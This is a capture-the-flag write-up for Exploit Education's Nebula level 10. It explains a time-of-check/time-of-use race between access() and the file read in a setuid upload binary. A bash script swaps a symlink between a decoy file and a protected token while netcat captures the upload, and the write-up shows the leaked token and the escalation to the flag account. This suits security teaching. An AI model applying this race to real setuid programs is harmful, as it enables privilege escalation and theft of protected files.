### [Exploit Education Level 10](https://exploit.education/nebula/level-10/)

## Challenge
The setuid binary at `/home/flag10/flag10` binary will upload any file given, as long as it meets the requirements of the 
`access()` system call.
To do this level, log in as the `level10` account with the password `level10`. Files for this level can be found in `/home/flag10`.

## Analysis
Looking at the code we can see that the binary uses port `18211` for uploading the file. Lets start a netcat listner and try
uploading a file
```bash
level10@nebula:~$ cd /home/flag10
level10@nebula:/home/flag10$ ls -la
total 14
drwxr-x--- 2 flag10 level10   93 2011-11-20 21:22 .
drwxr-xr-x 1 root   root     120 2012-08-27 07:18 ..

Alright it works. So it copies any files which we have permission to read. But we want to copy token but we don't have access
to token. 
## Vulnerability
[access() syscall vulnerability](https://linux.die.net/man/2/access)
>Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a >security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this >reason, the use of this system call should be avoided. 

So the vulnerability is that during the short interval between the `access()` syscall and the opening the file we can modify the
file such that we can read the contents of a different file.  

In the following code the system checks if we have access to the file and if we do then copies the contents of the file. There is a few
milliseconds gap between the check and the writing of the file. If we use a file which points to a file we have access to using symlink, it will pass the access `check` and then if we can change the symlink to point to the token file before the `write` we will be able to copy the contents of the token file. Lets see how we can do that.
```cpp
if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
```

## Solution
Lets write a script to use the milliseconds of gap between the `access` and `write`
```bash
level10@nebula:~$ echo "fake" >> /tmp/faketoken
level10@nebula:~$ touch sym_link
level10@nebula:~$ cat run.sh
for i in {1..1000}; do nc -l 18211 >> out; done &
for i in {1..1000}; do ln -sf /tmp/faketoken /home/level10/sym_token;ln -sf /home/flag10/token /home/level10/sym_token; done &
for i in {1..1000}; do /home/flag10/flag10 /home/level10/sym_token 127.0.0.1; done &
```

The first line keeps on starting a `netcat` listener and writes the output to a file named `out`  
The second line keeps on changing the `symlink` of `/home/level10/sym_token` form a file in `/tmp` directory to the `token` file  
The third line keeps on writing the file that is pointed to by the file `/home/leve10/sym_token`  
And within the 1000 iterations we will reach a point at which the file `/home/level10/sym_token` will point to the file in `tmp`
directory when `access` is called but will point to `token` file when `write` call is made

Lets check the contents of `out` file
```bash
level10@nebula:~$ ./run.sh
level10@nebula:~$ cat out | grep -v "o" | less
fake
fake
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
fake
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

```

[Your terminal might keep on writing output. In that case you will have to open a new terminal to see the output]  
Lets try logging in using the token we got    
```bash
level10@nebula:~$ cat out | grep -v "o" | less
level10@nebula:~$ su -l flag10
Password:
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
```
